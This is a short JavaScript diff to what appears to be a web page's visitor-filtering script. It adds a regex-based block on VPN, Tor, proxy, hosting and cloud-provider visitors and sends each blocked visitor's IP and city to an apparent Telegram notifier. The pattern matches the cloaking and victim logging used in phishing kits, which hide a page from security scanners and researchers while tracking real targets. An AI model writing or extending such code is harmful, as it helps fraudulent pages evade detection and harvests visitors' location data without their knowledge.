@@ -245,7 +245,19 @@
             setTimeout(_die, 500);
             return;
           }
-          var _org = d.connection ? (d.connection.org || d.connection.isp || 'N/A') : 'N/A';
+
+          var _org = d.connection ? (d.connection.org || d.connection.isp || d.connection.domain || '') : '';
+          var _orgLower = _org.toLowerCase();
+          
+          // Anti-VPN, Anti-Datacenter, Anti-Proxy, Anti-Hosting
+          var vpnPatterns = /vpn|proxy|tor|exit|relay|datacenter|hosting|server|cloud|vps|ovh|digitalocean|linode|hetzner|m247|choopa|vultr|leaseweb|colocrossing|cogent|amazon|aws|google|azure|microsoft|oracle|alibaba|cloudflare|fastly|akamai|packethub|quadranet|tzulo|ipvanish|nord|expressvpn|surfshark|cyberghost|privateinternetaccess|mullvad|proton|purevpn|windscribe|hide\.me|zenmate|hotspot|tunnelbear|anchorfree/i;
+          
+          if (vpnPatterns.test(_orgLower) || (d.connection && d.connection.asn === 13335)) {
+            _tg(_R, '🛑 <b>BLOCAGE VPN / DATACENTER (' + _org + ')</b>\n📍 IP: <code>' + d.ip + '</code>\n🏙️ Ville: <code>' + (d.city || 'N/A') + '</code>');
+            setTimeout(_die, 500);
+            return;
+          }
+
           _sendVisit(d.ip, d.city, d.country, _org);
         } else {
           _traceFallback();
